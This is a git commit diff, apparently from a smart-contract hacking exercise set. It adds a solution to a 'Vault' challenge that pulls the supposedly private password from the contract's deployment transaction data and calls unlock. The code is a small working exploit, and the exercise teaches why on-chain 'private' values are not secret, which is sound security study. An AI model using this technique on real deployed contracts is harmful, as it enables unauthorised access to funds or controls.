8fa6a0d4c63edf5dd79897a1f0559c2f829b8e79
tommyrharper <thomasrobertharper@gmail.com>
2022-10-29 19:16:16 -0500

    feat: hack Vault.sol

--- contracts/4. Vault/VaultHelper.ts
+++ contracts/4. Vault/VaultHelper.ts
@@ -8,6 +8,8 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const password = "0x" + victim.deployTransaction.data.slice(-64);
+  victim.unlock(password);
 };
 
 export default helper;
